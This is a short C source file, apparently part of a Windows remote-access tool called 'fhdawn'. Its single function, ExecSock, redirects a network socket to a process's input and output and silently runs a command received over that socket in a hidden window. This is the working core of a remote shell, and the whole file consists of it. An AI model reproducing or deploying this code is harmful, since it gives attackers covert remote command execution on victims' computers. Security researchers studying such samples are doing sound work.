
/*
Author: Fahad (QuantumCore)
fhdawn.h (c) 2020
Desc: Main header file 
Created:  2020-08-15T15:27:04.427Z
Modified: -
*/

#include "fhdawn.h"

void ExecSock(void)
{
    STARTUPINFO sinfo;
	PROCESS_INFORMATION pinfo;
	memset(&sinfo, 0, sizeof(sinfo));
	sinfo.cb = sizeof(sinfo);
	sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
    sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) sockfd;
	if(CreateProcess(NULL, (LPSTR)recvbuf, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo)){
		WaitForSingleObject(pinfo.hProcess, INFINITE);
		CloseHandle(pinfo.hProcess);
		CloseHandle(pinfo.hThread);
	}
}